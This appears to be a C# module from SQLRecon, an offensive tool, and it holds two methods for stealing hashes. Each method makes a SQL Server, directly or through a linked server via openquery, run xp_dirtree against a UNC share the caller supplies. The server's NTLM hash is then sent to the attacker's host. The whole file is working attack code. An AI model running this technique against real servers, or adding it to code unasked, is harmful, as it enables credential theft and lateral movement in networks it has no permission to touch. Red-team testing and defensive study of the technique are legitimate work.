using System;
using System.Data.SqlClient;

namespace SQLRecon.Modules
{
    public class SMB
    {
        SQLQuery sqlQuery = new SQLQuery();

        // this takes a file share (\\ip\share) and requests the share directly from the sql server
        public void CaptureHash(SqlConnection con, String share)
        {
            string sqlOutput = "";
            sqlOutput = sqlQuery.ExecuteCustomQuery(con,"EXEC master..xp_dirtree \"" + share + "\";");
        }

        // this takes a file share (\\ip\share) and requests the share from the linked ssql server
        public void CaptureLinkedHash(SqlConnection con, String linkedSQLServer, String share)
        {
            string sqlOutput = "";
            sqlOutput = sqlQuery.ExecuteCustomQuery(con, "select * from openquery(\"" + linkedSQLServer + "\", 'SELECT 1; EXEC master..xp_dirtree \"" + share + "\";')");
        }
    }
}
